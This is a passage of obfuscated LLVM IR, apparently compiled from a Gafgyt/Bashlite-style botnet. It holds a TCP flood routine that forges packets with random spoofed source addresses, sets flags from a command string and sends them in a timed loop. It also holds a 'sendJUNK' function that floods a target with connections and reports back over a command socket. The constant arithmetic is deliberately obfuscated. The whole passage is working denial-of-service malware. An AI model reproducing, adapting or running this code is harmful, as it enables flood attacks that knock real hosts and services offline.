  %102 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %101, i32 0, i32 0
  %103 = load i32, i32* %102, align 4
  %104 = load i32, i32* %19, align 4
  %105 = call i32 @getRandomIP(i32 %104)
  %106 = call i32 @htonl(i32 %105) #13
  %107 = load i32, i32* %13, align 4
  %108 = sext i32 %107 to i64
  %109 = sub i64 0, %108
  %110 = sub i64 20, %109
  %111 = add i64 20, %108
  %112 = trunc i64 %110 to i32
  call void @makeIPPacket(%struct.iphdr* %100, i32 %103, i32 %106, i8 zeroext 6, i32 %112)
  %113 = call i32 @rand_cmwc()
  %114 = trunc i32 %113 to i16
  %115 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %116 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %115, i32 0, i32 0
  %117 = bitcast %union.anon.0* %116 to %struct.anon.1*
  %118 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %117, i32 0, i32 0
  store i16 %114, i16* %118, align 4
  %119 = call i32 @rand_cmwc()
  %120 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %121 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %120, i32 0, i32 0
  %122 = bitcast %union.anon.0* %121 to %struct.anon.1*
  %123 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %122, i32 0, i32 2
  store i32 %119, i32* %123, align 4
  %124 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %125 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %124, i32 0, i32 0
  %126 = bitcast %union.anon.0* %125 to %struct.anon.1*
  %127 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %126, i32 0, i32 3
  store i32 0, i32* %127, align 4
  %128 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %129 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %128, i32 0, i32 0
  %130 = bitcast %union.anon.0* %129 to %struct.anon.1*
  %131 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %130, i32 0, i32 4
  %132 = load i16, i16* %131, align 4
  %133 = xor i16 %132, -1
  %134 = xor i16 -241, -1
  %135 = xor i16 10155, -1
  %136 = or i16 %133, %134
  %137 = or i16 10155, %135
  %138 = xor i16 %136, -1
  %139 = and i16 %138, %137
  %140 = and i16 %132, -241
  %141 = and i16 %139, 80
  %142 = xor i16 %139, 80
  %143 = or i16 %141, %142
  %144 = or i16 %139, 80
  store i16 %143, i16* %131, align 4
  %145 = load i8*, i8** %12, align 8
  %146 = call i32 @strcmp(i8* %145, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.42, i32 0, i32 0)) #10
  %147 = icmp ne i32 %146, 0
  br i1 %147, label %254, label %148

; <label>:148:                                    ; preds = %87
  %149 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %150 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %149, i32 0, i32 0
  %151 = bitcast %union.anon.0* %150 to %struct.anon.1*
  %152 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %151, i32 0, i32 4
  %153 = load i16, i16* %152, align 4
  %154 = xor i16 %153, -1
  %155 = xor i16 -513, -1
  %156 = xor i16 -15639, -1
  %157 = or i16 %154, %155
  %158 = or i16 -15639, %156
  %159 = xor i16 %157, -1
  %160 = and i16 %159, %158
  %161 = and i16 %153, -513
  %162 = and i16 %160, 512
  %163 = xor i16 %160, 512
  %164 = or i16 %162, %163
  %165 = or i16 %160, 512
  store i16 %164, i16* %152, align 4
  %166 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %167 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %166, i32 0, i32 0
  %168 = bitcast %union.anon.0* %167 to %struct.anon.1*
  %169 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %168, i32 0, i32 4
  %170 = load i16, i16* %169, align 4
  %171 = xor i16 -1025, -1
  %172 = xor i16 %170, %171
  %173 = and i16 %172, %170
  %174 = and i16 %170, -1025
  %175 = and i16 %173, 1024
  %176 = xor i16 %173, 1024
  %177 = or i16 %175, %176
  %178 = or i16 %173, 1024
  store i16 %177, i16* %169, align 4
  %179 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %180 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %179, i32 0, i32 0
  %181 = bitcast %union.anon.0* %180 to %struct.anon.1*
  %182 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %181, i32 0, i32 4
  %183 = load i16, i16* %182, align 4
  %184 = xor i16 -257, -1
  %185 = xor i16 %183, %184
  %186 = and i16 %185, %183
  %187 = and i16 %183, -257
  %188 = xor i16 %186, -1
  %189 = xor i16 256, -1
  %190 = xor i16 -19269, -1
  %191 = and i16 %188, -19269
  %192 = and i16 %186, %190
  %193 = and i16 %189, -19269
  %194 = and i16 256, %190
  %195 = or i16 %191, %192
  %196 = or i16 %193, %194
  %197 = xor i16 %195, %196
  %198 = or i16 %188, %189
  %199 = xor i16 %198, -1
  %200 = or i16 -19269, %190
  %201 = and i16 %199, %200
  %202 = or i16 %197, %201
  %203 = or i16 %186, 256
  store i16 %202, i16* %182, align 4
  %204 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %205 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %204, i32 0, i32 0
  %206 = bitcast %union.anon.0* %205 to %struct.anon.1*
  %207 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %206, i32 0, i32 4
  %208 = load i16, i16* %207, align 4
  %209 = xor i16 -4097, -1
  %210 = xor i16 %208, %209
  %211 = and i16 %210, %208
  %212 = and i16 %208, -4097
  %213 = xor i16 %211, -1
  %214 = xor i16 4096, -1
  %215 = xor i16 -14367, -1
  %216 = and i16 %213, -14367
  %217 = and i16 %211, %215
  %218 = and i16 %214, -14367
  %219 = and i16 4096, %215
  %220 = or i16 %216, %217
  %221 = or i16 %218, %219
  %222 = xor i16 %220, %221
  %223 = or i16 %213, %214
  %224 = xor i16 %223, -1
  %225 = or i16 -14367, %215
  %226 = and i16 %224, %225
  %227 = or i16 %222, %226
  %228 = or i16 %211, 4096
  store i16 %227, i16* %207, align 4
  %229 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %230 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %229, i32 0, i32 0
  %231 = bitcast %union.anon.0* %230 to %struct.anon.1*
  %232 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %231, i32 0, i32 4
  %233 = load i16, i16* %232, align 4
  %234 = xor i16 -2049, -1
  %235 = xor i16 %233, %234
  %236 = and i16 %235, %233
  %237 = and i16 %233, -2049
  %238 = xor i16 %236, -1
  %239 = xor i16 2048, -1
  %240 = xor i16 16376, -1
  %241 = and i16 %238, 16376
  %242 = and i16 %236, %240
  %243 = and i16 %239, 16376
  %244 = and i16 2048, %240
  %245 = or i16 %241, %242
  %246 = or i16 %243, %244
  %247 = xor i16 %245, %246
  %248 = or i16 %238, %239
  %249 = xor i16 %248, -1
  %250 = or i16 16376, %240
  %251 = and i16 %249, %250
  %252 = or i16 %247, %251
  %253 = or i16 %236, 2048
  store i16 %252, i16* %232, align 4
  br label %393

; <label>:254:                                    ; preds = %87
  %255 = load i8*, i8** %12, align 8
  %256 = call i8* @strtok(i8* %255, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %256, i8** %23, align 8
  br label %257

; <label>:257:                                    ; preds = %390, %254
  %258 = load i8*, i8** %23, align 8
  %259 = icmp ne i8* %258, null
  br i1 %259, label %260, label %392

; <label>:260:                                    ; preds = %257
  %261 = load i8*, i8** %23, align 8
  %262 = call i32 @strcmp(i8* %261, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.44, i32 0, i32 0)) #10
  %263 = icmp ne i32 %262, 0
  br i1 %263, label %282, label %264

; <label>:264:                                    ; preds = %260
  %265 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %266 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %265, i32 0, i32 0
  %267 = bitcast %union.anon.0* %266 to %struct.anon.1*
  %268 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %267, i32 0, i32 4
  %269 = load i16, i16* %268, align 4
  %270 = xor i16 %269, -1
  %271 = xor i16 -513, -1
  %272 = xor i16 31918, -1
  %273 = or i16 %270, %271
  %274 = or i16 31918, %272
  %275 = xor i16 %273, -1
  %276 = and i16 %275, %274
  %277 = and i16 %269, -513
  %278 = and i16 %276, 512
  %279 = xor i16 %276, 512
  %280 = or i16 %278, %279
  %281 = or i16 %276, 512
  store i16 %280, i16* %268, align 4
  br label %390

; <label>:282:                                    ; preds = %260
  %283 = load i8*, i8** %23, align 8
  %284 = call i32 @strcmp(i8* %283, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.45, i32 0, i32 0)) #10
  %285 = icmp ne i32 %284, 0
  br i1 %285, label %312, label %286

; <label>:286:                                    ; preds = %282
  %287 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %288 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %287, i32 0, i32 0
  %289 = bitcast %union.anon.0* %288 to %struct.anon.1*
  %290 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %289, i32 0, i32 4
  %291 = load i16, i16* %290, align 4
  %292 = xor i16 -1025, -1
  %293 = xor i16 %291, %292
  %294 = and i16 %293, %291
  %295 = and i16 %291, -1025
  %296 = xor i16 %294, -1
  %297 = xor i16 1024, -1
  %298 = xor i16 -24900, -1
  %299 = and i16 %296, -24900
  %300 = and i16 %294, %298
  %301 = and i16 %297, -24900
  %302 = and i16 1024, %298
  %303 = or i16 %299, %300
  %304 = or i16 %301, %302
  %305 = xor i16 %303, %304
  %306 = or i16 %296, %297
  %307 = xor i16 %306, -1
  %308 = or i16 -24900, %298
  %309 = and i16 %307, %308
  %310 = or i16 %305, %309
  %311 = or i16 %294, 1024
  store i16 %310, i16* %290, align 4
  br label %389

; <label>:312:                                    ; preds = %282
  %313 = load i8*, i8** %23, align 8
  %314 = call i32 @strcmp(i8* %313, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.46, i32 0, i32 0)) #10
  %315 = icmp ne i32 %314, 0
  br i1 %315, label %334, label %316

; <label>:316:                                    ; preds = %312
  %317 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %318 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %317, i32 0, i32 0
  %319 = bitcast %union.anon.0* %318 to %struct.anon.1*
  %320 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %319, i32 0, i32 4
  %321 = load i16, i16* %320, align 4
  %322 = xor i16 %321, -1
  %323 = xor i16 -257, -1
  %324 = xor i16 -23648, -1
  %325 = or i16 %322, %323
  %326 = or i16 -23648, %324
  %327 = xor i16 %325, -1
  %328 = and i16 %327, %326
  %329 = and i16 %321, -257
  %330 = and i16 %328, 256
  %331 = xor i16 %328, 256
  %332 = or i16 %330, %331
  %333 = or i16 %328, 256
  store i16 %332, i16* %320, align 4
  br label %388

; <label>:334:                                    ; preds = %312
  %335 = load i8*, i8** %23, align 8
  %336 = call i32 @strcmp(i8* %335, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.47, i32 0, i32 0)) #10
  %337 = icmp ne i32 %336, 0
  br i1 %337, label %364, label %338

; <label>:338:                                    ; preds = %334
  %339 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %340 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %339, i32 0, i32 0
  %341 = bitcast %union.anon.0* %340 to %struct.anon.1*
  %342 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %341, i32 0, i32 4
  %343 = load i16, i16* %342, align 4
  %344 = xor i16 -4097, -1
  %345 = xor i16 %343, %344
  %346 = and i16 %345, %343
  %347 = and i16 %343, -4097
  %348 = xor i16 %346, -1
  %349 = xor i16 4096, -1
  %350 = xor i16 19511, -1
  %351 = and i16 %348, 19511
  %352 = and i16 %346, %350
  %353 = and i16 %349, 19511
  %354 = and i16 4096, %350
  %355 = or i16 %351, %352
  %356 = or i16 %353, %354
  %357 = xor i16 %355, %356
  %358 = or i16 %348, %349
  %359 = xor i16 %358, -1
  %360 = or i16 19511, %350
  %361 = and i16 %359, %360
  %362 = or i16 %357, %361
  %363 = or i16 %346, 4096
  store i16 %362, i16* %342, align 4
  br label %387

; <label>:364:                                    ; preds = %334
  %365 = load i8*, i8** %23, align 8
  %366 = call i32 @strcmp(i8* %365, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.48, i32 0, i32 0)) #10
  %367 = icmp ne i32 %366, 0
  br i1 %367, label %382, label %368

; <label>:368:                                    ; preds = %364
  %369 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %370 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %369, i32 0, i32 0
  %371 = bitcast %union.anon.0* %370 to %struct.anon.1*
  %372 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %371, i32 0, i32 4
  %373 = load i16, i16* %372, align 4
  %374 = xor i16 -2049, -1
  %375 = xor i16 %373, %374
  %376 = and i16 %375, %373
  %377 = and i16 %373, -2049
  %378 = and i16 %376, 2048
  %379 = xor i16 %376, 2048
  %380 = or i16 %378, %379
  %381 = or i16 %376, 2048
  store i16 %380, i16* %372, align 4
  br label %386

; <label>:382:                                    ; preds = %364
  %383 = load i32, i32* @mainCommSock, align 4
  %384 = load i8*, i8** %23, align 8
  %385 = call i32 (i32, i8*, ...) @sockprintf(i32 %383, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.49, i32 0, i32 0), i8* %384)
  br label %386

; <label>:386:                                    ; preds = %382, %368
  br label %387

; <label>:387:                                    ; preds = %386, %338
  br label %388

; <label>:388:                                    ; preds = %387, %316
  br label %389

; <label>:389:                                    ; preds = %388, %286
  br label %390

; <label>:390:                                    ; preds = %389, %264
  %391 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %391, i8** %23, align 8
  br label %257

; <label>:392:                                    ; preds = %257
  br label %393

; <label>:393:                                    ; preds = %392, %148
  %394 = call i32 @rand_cmwc()
  %395 = trunc i32 %394 to i16
  %396 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %397 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %396, i32 0, i32 0
  %398 = bitcast %union.anon.0* %397 to %struct.anon.1*
  %399 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %398, i32 0, i32 5
  store i16 %395, i16* %399, align 2
  %400 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %401 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %400, i32 0, i32 0
  %402 = bitcast %union.anon.0* %401 to %struct.anon.1*
  %403 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %402, i32 0, i32 6
  store i16 0, i16* %403, align 4
  %404 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %405 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %404, i32 0, i32 0
  %406 = bitcast %union.anon.0* %405 to %struct.anon.1*
  %407 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %406, i32 0, i32 7
  store i16 0, i16* %407, align 2
  %408 = load i32, i32* %9, align 4
  %409 = icmp eq i32 %408, 0
  br i1 %409, label %410, label %412

; <label>:410:                                    ; preds = %393
  %411 = call i32 @rand_cmwc()
  br label %417

; <label>:412:                                    ; preds = %393
  %413 = load i32, i32* %9, align 4
  %414 = trunc i32 %413 to i16
  %415 = call zeroext i16 @htons(i16 zeroext %414) #13
  %416 = zext i16 %415 to i32
  br label %417

; <label>:417:                                    ; preds = %412, %410
  %418 = phi i32 [ %411, %410 ], [ %416, %412 ]
  %419 = trunc i32 %418 to i16
  %420 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %421 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %420, i32 0, i32 0
  %422 = bitcast %union.anon.0* %421 to %struct.anon.1*
  %423 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %422, i32 0, i32 1
  store i16 %419, i16* %423, align 2
  %424 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %425 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %426 = call zeroext i16 @tcpcsum(%struct.iphdr* %424, %struct.tcphdr* %425)
  %427 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %428 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %427, i32 0, i32 0
  %429 = bitcast %union.anon.0* %428 to %struct.anon.1*
  %430 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %429, i32 0, i32 6
  store i16 %426, i16* %430, align 4
  %431 = bitcast i8* %94 to i16*
  %432 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %433 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %432, i32 0, i32 2
  %434 = load i16, i16* %433, align 2
  %435 = zext i16 %434 to i32
  %436 = call zeroext i16 @csum(i16* %431, i32 %435)
  %437 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %438 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %437, i32 0, i32 7
  store i16 %436, i16* %438, align 2
  %439 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %440 = load i32, i32* %10, align 4
  %441 = sub i32 0, %440
  %442 = sub i32 %439, %441
  %443 = add nsw i32 %439, %440
  store i32 %442, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %444

; <label>:444:                                    ; preds = %497, %496, %417
  br label %445

; <label>:445:                                    ; preds = %444
  %446 = load i32, i32* %17, align 4
  %447 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %448 = call i64 @sendto(i32 %446, i8* %94, i64 %91, i32 0, %struct.sockaddr* %447, i32 16)
  %449 = load i32, i32* %19, align 4
  %450 = call i32 @getRandomIP(i32 %449)
  %451 = call i32 @htonl(i32 %450) #13
  %452 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %453 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %452, i32 0, i32 8
  store i32 %451, i32* %453, align 4
  %454 = call i32 @rand_cmwc()
  %455 = trunc i32 %454 to i16
  %456 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %457 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %456, i32 0, i32 3
  store i16 %455, i16* %457, align 4
  %458 = call i32 @rand_cmwc()
  %459 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %460 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %459, i32 0, i32 0
  %461 = bitcast %union.anon.0* %460 to %struct.anon.1*
  %462 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %461, i32 0, i32 2
  store i32 %458, i32* %462, align 4
  %463 = call i32 @rand_cmwc()
  %464 = trunc i32 %463 to i16
  %465 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %466 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %465, i32 0, i32 0
  %467 = bitcast %union.anon.0* %466 to %struct.anon.1*
  %468 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %467, i32 0, i32 0
  store i16 %464, i16* %468, align 4
  %469 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %470 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %469, i32 0, i32 0
  %471 = bitcast %union.anon.0* %470 to %struct.anon.1*
  %472 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %471, i32 0, i32 6
  store i16 0, i16* %472, align 4
  %473 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %474 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %475 = call zeroext i16 @tcpcsum(%struct.iphdr* %473, %struct.tcphdr* %474)
  %476 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %477 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %476, i32 0, i32 0
  %478 = bitcast %union.anon.0* %477 to %struct.anon.1*
  %479 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %478, i32 0, i32 6
  store i16 %475, i16* %479, align 4
  %480 = bitcast i8* %94 to i16*
  %481 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %482 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %481, i32 0, i32 2
  %483 = load i16, i16* %482, align 2
  %484 = zext i16 %483 to i32
  %485 = call zeroext i16 @csum(i16* %480, i32 %484)
  %486 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %487 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %486, i32 0, i32 7
  store i16 %485, i16* %487, align 2
  %488 = load i32, i32* %25, align 4
  %489 = load i32, i32* %15, align 4
  %490 = icmp eq i32 %488, %489
  br i1 %490, label %491, label %497

; <label>:491:                                    ; preds = %445
  %492 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %493 = load i32, i32* %24, align 4
  %494 = icmp sgt i32 %492, %493
  br i1 %494, label %495, label %496

; <label>:495:                                    ; preds = %491
  br label %502

; <label>:496:                                    ; preds = %491
  store i32 0, i32* %25, align 4
  br label %444

; <label>:497:                                    ; preds = %445
  %498 = load i32, i32* %25, align 4
  %499 = sub i32 0, 1
  %500 = sub i32 %498, %499
  %501 = add i32 %498, 1
  store i32 %500, i32* %25, align 4
  br label %444

; <label>:502:                                    ; preds = %495
  %503 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %503)
  br label %504

; <label>:504:                                    ; preds = %502, %59, %51, %44
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #2

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @sendJUNK(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %20 = call i32 @getdtablesize() #4
  %21 = sdiv i32 %20, 2
  store i32 %21, i32* %7, align 4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %22, align 4
  %23 = load i32, i32* %5, align 4
  %24 = trunc i32 %23 to i16
  %25 = call zeroext i16 @htons(i16 zeroext %24) #13
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %25, i16* %26, align 2
  %27 = load i8*, i8** %4, align 8
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %29 = call i32 @getHost(i8* %27, %struct.in_addr* %28)
  %30 = icmp ne i32 %29, 0
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %3
  br label %264

; <label>:32:                                     ; preds = %3
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %34 = getelementptr inbounds [8 x i8], [8 x i8]* %33, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %34, i8 0, i64 8, i32 4, i1 false)
  %35 = load i32, i32* %7, align 4
  %36 = zext i32 %35 to i64
  %37 = call i8* @llvm.stacksave()
  store i8* %37, i8** %10, align 8
  %38 = alloca %struct.state_t, i64 %36, align 16
  %39 = bitcast %struct.state_t* %38 to i8*
  %40 = load i32, i32* %7, align 4
  %41 = sext i32 %40 to i64
  %42 = mul i64 %41, 5
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 %42, i32 16, i1 false)
  %43 = call noalias i8* @malloc(i64 1024) #4
  store i8* %43, i8** %16, align 8
  %44 = load i8*, i8** %16, align 8
  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 1024, i32 1, i1 false)
  %45 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %46 = load i32, i32* %6, align 4
  %47 = sub i32 %45, -2121250198
  %48 = add i32 %47, %46
  %49 = add i32 %48, -2121250198
  %50 = add nsw i32 %45, %46
  store i32 %49, i32* %17, align 4
  br label %51

; <label>:51:                                     ; preds = %261, %32
  %52 = load i32, i32* %17, align 4
  %53 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %54 = icmp sgt i32 %52, %53
  br i1 %54, label %55, label %262

; <label>:55:                                     ; preds = %51
  store i32 0, i32* %8, align 4
  br label %56

; <label>:56:                                     ; preds = %255, %55
  %57 = load i32, i32* %8, align 4
  %58 = load i32, i32* %7, align 4
  %59 = icmp slt i32 %57, %58
  br i1 %59, label %60, label %261

; <label>:60:                                     ; preds = %56
  %61 = load i32, i32* %8, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %62
  %64 = getelementptr inbounds %struct.state_t, %struct.state_t* %63, i32 0, i32 1
  %65 = load i8, i8* %64, align 4
  %66 = zext i8 %65 to i32
  switch i32 %66, label %254 [
    i32 0, label %67
    i32 1, label %126
    i32 2, label %228
  ]

; <label>:67:                                     ; preds = %60
  %68 = call i32 @socket(i32 2, i32 1, i32 0) #4
  %69 = load i32, i32* %8, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %70
  %72 = getelementptr inbounds %struct.state_t, %struct.state_t* %71, i32 0, i32 0
  store i32 %68, i32* %72, align 8
  %73 = load i32, i32* %8, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %74
  %76 = getelementptr inbounds %struct.state_t, %struct.state_t* %75, i32 0, i32 0
  %77 = load i32, i32* %76, align 8
  %78 = load i32, i32* %8, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %79
  %81 = getelementptr inbounds %struct.state_t, %struct.state_t* %80, i32 0, i32 0
  %82 = load i32, i32* %81, align 8
  %83 = call i32 (i32, i32, ...) @fcntl(i32 %82, i32 3, i8* null)
  %84 = xor i32 %83, -1
  %85 = xor i32 2048, -1
  %86 = xor i32 -1874926882, -1
  %87 = and i32 %84, -1874926882
  %88 = and i32 %83, %86
  %89 = and i32 %85, -1874926882
  %90 = and i32 2048, %86
  %91 = or i32 %87, %88
  %92 = or i32 %89, %90
  %93 = xor i32 %91, %92
  %94 = or i32 %84, %85
  %95 = xor i32 %94, -1
  %96 = or i32 -1874926882, %86
  %97 = and i32 %95, %96
  %98 = or i32 %93, %97
  %99 = or i32 %83, 2048
  %100 = call i32 (i32, i32, ...) @fcntl(i32 %77, i32 4, i32 %98)
  %101 = load i32, i32* %8, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %102
  %104 = getelementptr inbounds %struct.state_t, %struct.state_t* %103, i32 0, i32 0
  %105 = load i32, i32* %104, align 8
  %106 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %107 = call i32 @connect(i32 %105, %struct.sockaddr* %106, i32 16)
  %108 = icmp ne i32 %107, -1
  br i1 %108, label %113, label %109

; <label>:109:                                    ; preds = %67
  %110 = call i32* @__errno_location() #13
  %111 = load i32, i32* %110, align 4
  %112 = icmp ne i32 %111, 115
  br i1 %112, label %113, label %120

; <label>:113:                                    ; preds = %109, %67
  %114 = load i32, i32* %8, align 4
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %115
  %117 = getelementptr inbounds %struct.state_t, %struct.state_t* %116, i32 0, i32 0
  %118 = load i32, i32* %117, align 8
  %119 = call i32 @close(i32 %118)
  br label %125

; <label>:120:                                    ; preds = %109
  %121 = load i32, i32* %8, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %122
  %124 = getelementptr inbounds %struct.state_t, %struct.state_t* %123, i32 0, i32 1
  store i8 1, i8* %124, align 4
  br label %125

; <label>:125:                                    ; preds = %120, %113
  br label %254

; <label>:126:                                    ; preds = %60
  br label %127

; <label>:127:                                    ; preds = %126
  %128 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %129 = getelementptr inbounds [16 x i64], [16 x i64]* %128, i64 0, i64 0
  %130 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %129) #4, !srcloc !6
  %131 = extractvalue { i64, i64* } %130, 0
  %132 = extractvalue { i64, i64* } %130, 1
  %133 = trunc i64 %131 to i32
  store i32 %133, i32* %18, align 4
  %134 = ptrtoint i64* %132 to i64
  %135 = trunc i64 %134 to i32
  store i32 %135, i32* %19, align 4
  br label %136

; <label>:136:                                    ; preds = %127
  br label %137

; <label>:137:                                    ; preds = %136
  %138 = load i32, i32* %8, align 4
  %139 = sext i32 %138 to i64
  %140 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %139
  %141 = getelementptr inbounds %struct.state_t, %struct.state_t* %140, i32 0, i32 0
  %142 = load i32, i32* %141, align 8
